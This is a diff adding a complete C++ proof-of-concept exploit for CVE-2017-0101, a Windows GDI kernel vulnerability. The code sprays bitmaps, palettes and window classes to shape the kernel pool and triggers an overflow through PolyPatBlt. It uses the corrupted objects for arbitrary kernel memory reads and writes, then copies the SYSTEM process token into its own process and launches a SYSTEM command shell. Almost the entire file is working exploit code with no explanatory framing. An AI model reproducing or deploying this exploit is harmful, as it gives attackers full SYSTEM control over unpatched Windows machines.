@@ -1,0 +1,666 @@
+#include <Windows.h>
+#include <wingdi.h>
+#include <iostream>
+#include <Psapi.h>
+#pragma comment(lib, "psapi.lib")
+
+#define POCDEBUG 0
+
+#if POCDEBUG == 1
+#define POCDEBUG_BREAK() getchar()
+#elif POCDEBUG == 2
+#define POCDEBUG_BREAK() DebugBreak()
+#else
+#define POCDEBUG_BREAK()
+#endif
+
+CONST LONG maxTimes = 2000;
+CONST LONG tmpTimes = 3000;
+static HBITMAP hbitmap[maxTimes] = { NULL };
+static HPALETTE hpalette[maxTimes] = { NULL };
+
+static DWORD    iMemHunted = NULL;
+static HBITMAP  hBmpHunted = NULL;
+static PDWORD   pBmpHunted = NULL;
+static HPALETTE hPalExtend = NULL;
+
+CONST LONG iExtPaleHmgr = 809;
+CONST LONG iExtcEntries = 814;
+CONST LONG iExtPalColor = 828;
+
+typedef struct _PATRECT {
+    INT nXLeft;
+    INT nYLeft;
+    INT nWidth;
+    INT nHeight;
+    HBRUSH hBrush;
+} PATRECT, *PPATRECT;
+
+typedef BOOL (WINAPI *pfPolyPatBlt)(HDC hdc, DWORD rop, PPATRECT pPoly, DWORD Count, DWORD Mode);
+
+static
+BOOL xxCreateBitmaps(INT nWidth, INT Height, UINT nbitCount)
+{
+    POCDEBUG_BREAK();
+    for (LONG i = 0; i < maxTimes; i++)
+    {
+        hbitmap[i] = CreateBitmap(nWidth, Height, 1, nbitCount, NULL);
+        if (hbitmap[i] == NULL)
+        {
+            return FALSE;
+        }
+    }
+    return TRUE;
+}
+
+static
+BOOL xxDeleteBitmaps(VOID)
+{
+    BOOL bReturn = FALSE;
+    POCDEBUG_BREAK();
+    for (LONG i = 0; i < maxTimes; i++)
+    {
+        bReturn = DeleteObject(hbitmap[i]);
+        hbitmap[i] = NULL;
+    }
+    return bReturn;
+}
+
+static
+BOOL xxRegisterWndClasses(LPCSTR menuName)
+{
+    POCDEBUG_BREAK();
+    CHAR buf[0x10] = { 0 };
+    for (LONG i = 0; i < tmpTimes; i++)
+    {
+        WNDCLASSEXA Class = { 0 };
+        sprintf(buf, "CLS_%d", i);
+        Class.lpfnWndProc = DefWindowProcA;
+        Class.lpszClassName = buf;
+        Class.lpszMenuName = menuName;
+        Class.cbSize = sizeof(WNDCLASSEXA);
+        if (!RegisterClassExA(&Class))
+        {
+            return FALSE;
+        }
+    }
+    return TRUE;
+}
+
+static
+BOOL xxDigHoleInWndClasses(LONG b, LONG e)
+{
+    BOOL bReturn = FALSE;
+    CHAR buf[0x10] = { 0 };
+    for (LONG i = b; i < e; i++)
+    {
+        sprintf(buf, "CLS_%d", i);
+        bReturn = UnregisterClassA(buf, NULL);
+    }
+    return bReturn;
+}
+
+static
+BOOL xxUnregisterWndClasses(VOID)
+{
+    BOOL bReturn = FALSE;
+    CHAR buf[0x10] = { 0 };
+    for (LONG i = 0; i < tmpTimes; i++)
+    {
+        sprintf(buf, "CLS_%d", i);
+        bReturn = UnregisterClassA(buf, NULL);
+    }
+    return bReturn;
+}
+
+static
+BOOL xxCreatePalettes(ULONG cEntries)
+{
+    BOOL bReturn = FALSE;
+    POCDEBUG_BREAK();
+    PLOGPALETTE pal = NULL;
+    // 0x64*4+0x58+8=0x1f0
+    pal = (PLOGPALETTE)malloc(sizeof(LOGPALETTE) + cEntries * sizeof(PALETTEENTRY));
+    pal->palVersion = 0x300;
+    pal->palNumEntries = cEntries;
+    for (LONG i = 0; i < maxTimes; i++)
+    {
+        hpalette[i] = CreatePalette(pal);
+        if (hpalette[i] == NULL)
+        {
+            bReturn = FALSE;
+            break;
+        }
+        bReturn = TRUE;
+    }
+    free(pal);
+    return bReturn;
+}
+
+static
+BOOL xxDeletePalettes(VOID)
+{
+    BOOL bReturn = FALSE;
+    POCDEBUG_BREAK();
+    for (LONG i = 0; i < maxTimes; i++)
+    {
+        bReturn = DeleteObject(hpalette[i]);
+        hpalette[i] = NULL;
+    }
+    return bReturn;
+}
+
+static
+BOOL xxRetrieveBitmapBits(VOID)
+{
+    pBmpHunted = static_cast<PDWORD>(malloc(0x1000));
+    ZeroMemory(pBmpHunted, 0x1000);
+    LONG index = -1;
+    LONG iLeng = -1;
+    POCDEBUG_BREAK();
+    for (LONG i = 0; i < maxTimes; i++)
+    {
+        iLeng = GetBitmapBits(hbitmap[i], 0x1000, pBmpHunted);
+        if (iLeng < 0xCA0)
+        {
+            continue;
+        }
+        index = i;
+        std::cout << "LOCATE: " << '[' << i << ']' << hbitmap[i] << std::endl;
+        hBmpHunted = hbitmap[i];
+        break;
+    }
+    if (index == -1)
+    {
+        std::cout << "FAILED: " << (PVOID)(-1) << std::endl;
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static
+VOID xxOutputBitmapBits(VOID)
+{
+    POCDEBUG_BREAK();
+    for (LONG i = 0; i < 0x1000 / sizeof(DWORD); i++)
+    {
+        std::cout << '[';
+        std::cout.fill('0');
+        std::cout.width(4);
+        std::cout << i << ']' << (PVOID)pBmpHunted[i];
+        if (((i + 1) % 4) != 0)
+        {
+            std::cout << " ";
+        }
+        else
+        {
+            std::cout << std::endl;
+        }
+    }
+    std::cout.width(0);
+}
+
+static
+BOOL xxGetExtendPalette(HPALETTE hHandle)
+{
+    LONG index = -1;
+    POCDEBUG_BREAK();
+    for (LONG i = 0; i < maxTimes; i++)
+    {
+        if (hpalette[i] != hHandle)
+        {
+            continue;
+        }
+        index = i;
+        std::cout << "LOCATE: " << '[' << i << ']' << hpalette[i] << std::endl;
+        hPalExtend = hpalette[i];
+        break;
+    }
+    if (index == -1)
+    {
+        std::cout << "FAILED: " << (PVOID)(-1) << std::endl;
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static
+BOOL xxPoint(LONG id, DWORD Value)
+{
+    LONG iLeng = 0x00;
+    pBmpHunted[id] = Value;
+    iLeng = SetBitmapBits(hBmpHunted, 0xD00, pBmpHunted);
+    if (iLeng < 0xD00)
+    {
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static
+BOOL xxPointToHit(LONG addr, PVOID pvBits, DWORD cb)
+{
+    UINT iLeng = 0;
+    pBmpHunted[iExtPalColor] = addr;
+    iLeng = SetBitmapBits(hBmpHunted, 0xD00, pBmpHunted);
+    if (iLeng < 0xD00)
+    {
+        return FALSE;
+    }
+    PVOID pvTable = NULL;
+    UINT cbSize = (cb + 3) & ~3; // sizeof(PALETTEENTRY) => 4
+    pvTable = malloc(cbSize);
+    memcpy(pvTable, pvBits, cb);
+    iLeng = SetPaletteEntries(hPalExtend, 0, cbSize / 4, (PPALETTEENTRY)pvTable);
+    free(pvTable);
+    if (iLeng < cbSize / 4)
+    {
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static
+BOOL xxPointToGet(LONG addr, PVOID pvBits, DWORD cb)
+{
+    BOOL iLeng = 0;
+    pBmpHunted[iExtPalColor] = addr;
+    iLeng = SetBitmapBits(hBmpHunted, 0xD00, pBmpHunted);
+    if (iLeng < 0xD00)
+    {
+        return FALSE;
+    }
+    PVOID pvTable = NULL;
+    UINT cbSize = (cb + 3) & ~3; // sizeof(PALETTEENTRY) => 4
+    pvTable = malloc(cbSize);
+    iLeng = GetPaletteEntries(hPalExtend, 0, cbSize / 4, (PPALETTEENTRY)pvTable);
+    memcpy(pvBits, pvTable, cb);
+    free(pvTable);
+    if (iLeng < cbSize / 4)
+    {
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static
+BOOL xxFixHuntedPoolHeader(VOID)
+{
+    DWORD szInputBit[0x100] = { 0 };
+    CONST LONG iTrueBmpHead = 937;
+    szInputBit[0] = pBmpHunted[iTrueBmpHead + 0];
+    szInputBit[1] = pBmpHunted[iTrueBmpHead + 1];
+    BOOL bReturn = FALSE;
+    bReturn = xxPointToHit(iMemHunted + 0x000, szInputBit, 0x08);
+    if (!bReturn)
+    {
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static
+BOOL xxFixHuntedBitmapObject(VOID)
+{
+    DWORD szInputBit[0x100] = { 0 };
+    szInputBit[0] = (DWORD)hBmpHunted;
+    BOOL bReturn = FALSE;
+    bReturn = xxPointToHit(iMemHunted + 0x08, szInputBit, 0x04);
+    if (!bReturn)
+    {
+        return FALSE;
+    }
+    bReturn = xxPointToHit(iMemHunted + 0x1c, szInputBit, 0x04);
+    if (!bReturn)
+    {
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static
+DWORD_PTR
+xxGetNtoskrnlAddress(VOID)
+{
+    DWORD_PTR AddrList[500] = { 0 };
+    DWORD cbNeeded = 0;
+    EnumDeviceDrivers((LPVOID *)&AddrList, sizeof(AddrList), &cbNeeded);
+    return AddrList[0];
+}
+
+static
+DWORD_PTR
+xxGetSysPROCESS(VOID)
+{
+    DWORD_PTR Module = 0x00;
+    DWORD_PTR NtAddr = 0x00;
+    Module = (DWORD_PTR)LoadLibraryA("ntkrnlpa.exe");
+    NtAddr = (DWORD_PTR)GetProcAddress((HMODULE)Module, "PsInitialSystemProcess");
+    FreeLibrary((HMODULE)Module);
+    NtAddr = NtAddr - Module;
+    Module = xxGetNtoskrnlAddress();
+    if (Module == 0x00)
+    {
+        return 0x00;
+    }
+    NtAddr = NtAddr + Module;
+    if (!xxPointToGet(NtAddr, &NtAddr, sizeof(DWORD_PTR)))
+    {
+        return 0x00;
+    }
+    return NtAddr;
+}
+
+CONST LONG off_EPROCESS_UniqueProId = 0x0b4;
+CONST LONG off_EPROCESS_ActiveLinks = 0x0b8;
+
+static
+DWORD_PTR
+xxGetTarPROCESS(DWORD_PTR SysPROC)
+{
+    if (SysPROC == 0x00)
+    {
+        return 0x00;
+    }
+    DWORD_PTR point = SysPROC;
+    DWORD_PTR value = 0x00;
+    do
+    {
+        value = 0x00;
+        xxPointToGet(point + off_EPROCESS_UniqueProId, &value, sizeof(DWORD_PTR));
+        if (value == 0x00)
+        {
+            break;
+        }
+        if (value == GetCurrentProcessId())
+        {
+            return point;
+        }
+        value = 0x00;
+        xxPointToGet(point + off_EPROCESS_ActiveLinks, &value, sizeof(DWORD_PTR));
+        if (value == 0x00)
+        {
+            break;
+        }
+        point = value - off_EPROCESS_ActiveLinks;
+        if (point == SysPROC)
+        {
+            break;
+        }
+    } while (TRUE);
+    return 0x00;
+}
+
+CONST LONG off_EPROCESS_Token = 0x0f8;
+static DWORD_PTR dstToken = 0x00;
+static DWORD_PTR srcToken = 0x00;
+
+static
+BOOL
+xxModifyTokenPointer(DWORD_PTR dstPROC, DWORD_PTR srcPROC)
+{
+    if (dstPROC == 0x00 || srcPROC == 0x00)
+    {
+        return FALSE;
+    }
+    // get target process original token pointer
+    xxPointToGet(dstPROC + off_EPROCESS_Token, &dstToken, sizeof(DWORD_PTR));
+    if (dstToken == 0x00)
+    {
+        return FALSE;
+    }
+    // get system process token pointer
+    xxPointToGet(srcPROC + off_EPROCESS_Token, &srcToken, sizeof(DWORD_PTR));
+    if (srcToken == 0x00)
+    {
+        return FALSE;
+    }
+    // modify target process token pointer to system
+    xxPointToHit(dstPROC + off_EPROCESS_Token, &srcToken, sizeof(DWORD_PTR));
+    // just test if the modification is successful
+    DWORD_PTR tmpToken = 0x00;
+    xxPointToGet(dstPROC + off_EPROCESS_Token, &tmpToken, sizeof(DWORD_PTR));
+    if (tmpToken != srcToken)
+    {
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static
+BOOL
+xxRecoverTokenPointer(DWORD_PTR dstPROC, DWORD_PTR srcPROC)
+{
+    if (dstPROC == 0x00 || srcPROC == 0x00)
+    {
+        return FALSE;
+    }
+    if (dstToken == 0x00 || srcToken == 0x00)
+    {
+        return FALSE;
+    }
+    // recover the original token pointer to target process
+    xxPointToHit(dstPROC + off_EPROCESS_Token, &dstToken, sizeof(DWORD_PTR));
+    return TRUE;
+}
+
+static
+VOID xxCreateCmdLineProcess(VOID)
+{
+    STARTUPINFO si = { sizeof(si) };
+    PROCESS_INFORMATION pi = { 0 };
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_SHOW;
+    WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
+    BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+    if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
+}
+
+static
+VOID xxPrivilegeElevation(VOID)
+{
+    BOOL bReturn = FALSE;
+    do
+    {
+        DWORD SysPROC = 0x0;
+        DWORD TarPROC = 0x0;
+        POCDEBUG_BREAK();
+        SysPROC = xxGetSysPROCESS();
+        if (SysPROC == 0x00)
+        {
+            break;
+        }
+        std::cout << "SYSTEM PROCESS: " << (PVOID)SysPROC << std::endl;
+        POCDEBUG_BREAK();
+        TarPROC = xxGetTarPROCESS(SysPROC);
+        if (TarPROC == 0x00)
+        {
+            break;
+        }
+        std::cout << "TARGET PROCESS: " << (PVOID)TarPROC << std::endl;
+        POCDEBUG_BREAK();
+        bReturn = xxModifyTokenPointer(TarPROC, SysPROC);
+        if (!bReturn)
+        {
+            break;
+        }
+        std::cout << "MODIFIED TOKEN TO SYSTEM!" << std::endl;
+        std::cout << "CREATE NEW CMDLINE PROCESS..." << std::endl;
+        POCDEBUG_BREAK();
+        xxCreateCmdLineProcess();
+        POCDEBUG_BREAK();
+        std::cout << "RECOVER TOKEN..." << std::endl;
+        bReturn = xxRecoverTokenPointer(TarPROC, SysPROC);
+        if (!bReturn)
+        {
+            break;
+        }
+        bReturn = TRUE;
+    } while (FALSE);
+    if (!bReturn)
+    {
+        std::cout << "FAILED" << std::endl;
+    }
+}
+
+INT POC_CVE20170101(VOID)
+{
+    std::cout << "-------------------" << std::endl;
+    std::cout << "POC - CVE-2017-0101" << std::endl;
+    std::cout << "-------------------" << std::endl;
+
+    BOOL bReturn = FALSE;
+    HDC hdc = NULL;
+    HBITMAP hbmp = NULL;
+    HBRUSH hbru = NULL;
+    pfPolyPatBlt pfnPolyPatBlt = NULL;
+    do
+    {
+        hdc = GetDC(NULL);
+        std::cout << "GET DEVICE CONTEXT: " << hdc << std::endl;
+        if (hdc == NULL)
+        {
+            break;
+        }
+
+        std::cout << "CREATE PATTERN BRUSH BITMAP..." << std::endl;
+        hbmp = CreateBitmap(0x36D, 0x12AE8F, 1, 1, NULL);
+        if (hbmp == NULL)
+        {
+            break;
+        }
+
+        std::cout << "CREATE PATTERN BRUSH..." << std::endl;
+        hbru = CreatePatternBrush(hbmp);
+        if (hbru == NULL)
+        {
+            break;
+        }
+
+        std::cout << "CREATE BITMAPS (1)..." << std::endl;
+        bReturn = xxCreateBitmaps(0xE8C, 1, 8);
+        if (!bReturn)
+        {
+            break;
+        }
+
+        std::cout << "REGISTER WINDOW CLASSES..." << std::endl;
+        bReturn = xxRegisterWndClasses("KCUF");
+        if (!bReturn)
+        {
+            break;
+        }
+
+        std::cout << "DELETE BITMAPS (1)..." << std::endl;
+        xxDeleteBitmaps();
+
+        std::cout << "CREATE BITMAPS (2)..." << std::endl;
+        bReturn = xxCreateBitmaps(0xC98, 1, 8);
+        if (!bReturn)
+        {
+            break;
+        }
+
+        std::cout << "CREATE PALETTES (1)..." << std::endl;
+        bReturn = xxCreatePalettes(0x64);
+        if (!bReturn)
+        {
+            break;
+        }
+
+        std::cout << "UNREGISTER WINDOW CLASSES (H)..." << std::endl;
+        xxDigHoleInWndClasses(1000, 2000);
+
+        std::cout << "POLYPATBLT..." << std::endl;
+        POCDEBUG_BREAK();
+        pfnPolyPatBlt = (pfPolyPatBlt)GetProcAddress(GetModuleHandleA("gdi32"), "PolyPatBlt");
+        if (pfnPolyPatBlt == NULL)
+        {
+            break;
+        }
+        PATRECT ppb[1] = { 0 };
+        ppb[0].nXLeft  = 0x100;
+        ppb[0].nYLeft  = 0x100;
+        ppb[0].nWidth  = 0x100;
+        ppb[0].nHeight = 0x100;
+        ppb[0].hBrush  = hbru;
+        pfnPolyPatBlt(hdc, PATCOPY, ppb, 1, 0);
+
+        std::cout << "LOCATE HUNTED BITMAP..." << std::endl;
+        bReturn = xxRetrieveBitmapBits();
+        if (!bReturn)
+        {
+            break;
+        }
+
+        // std::cout << "OUTPUT BITMAP BITS..." << std::endl;
+        // xxOutputBitmapBits();
+
+        std::cout << "LOCATE EXTEND PALETTE..." << std::endl;
+        bReturn = xxGetExtendPalette((HPALETTE)pBmpHunted[iExtPaleHmgr]);
+        if (!bReturn)
+        {
+            break;
+        }
+
+        if ((pBmpHunted[iExtcEntries]) != 0x64 ||
+            (pBmpHunted[iExtPalColor] & 0xFFF) != 0x00000E54)
+        {
+            bReturn = FALSE;
+            std::cout << "FAILED: " << (PVOID)pBmpHunted[iExtPalColor] << std::endl;
+            break;
+        }
+        iMemHunted = (pBmpHunted[iExtPalColor] & ~0xFFF);
+        std::cout << "HUNTED PAGE: " << (PVOID)iMemHunted << std::endl;
+        std::cout << "FIX HUNTED POOL HEADER..." << std::endl;
+        bReturn = xxFixHuntedPoolHeader();
+        if (!bReturn)
+        {
+            break;
+        }
+
+        std::cout << "FIX HUNTED BITMAP OBJECT..." << std::endl;
+        bReturn = xxFixHuntedBitmapObject();
+        if (!bReturn)
+        {
+            break;
+        }
+
+        std::cout << "-------------------" << std::endl;
+        std::cout << "PRIVILEGE ELEVATION" << std::endl;
+        std::cout << "-------------------" << std::endl;
+        xxPrivilegeElevation();
+        std::cout << "-------------------" << std::endl;
+
+        std::cout << "DELETE BITMAPS (2)..." << std::endl;
+        xxDeleteBitmaps();
+
+        std::cout << "DELETE PALETTES (1)..." << std::endl;
+        xxDeletePalettes();
+
+        bReturn = TRUE;
+    } while (FALSE);
+
+    if (bReturn == FALSE)
+    {
+        std::cout << GetLastError() << std::endl;
+    }
+
+    POCDEBUG_BREAK();
+    std::cout << "DELETE BRUSH..." << std::endl;
+    DeleteObject(hbru);
+    DeleteObject(hbmp);
+
+    std::cout << "UNREGISTER WINDOW CLASSES (1)..." << std::endl;
+    xxUnregisterWndClasses();
+
+    std::cout << "-------------------" << std::endl;
+    getchar();
+    return 0;
+}
+
+INT main(INT argc, CHAR *argv[])
+{
+    POC_CVE20170101();
+    return 0;
+}
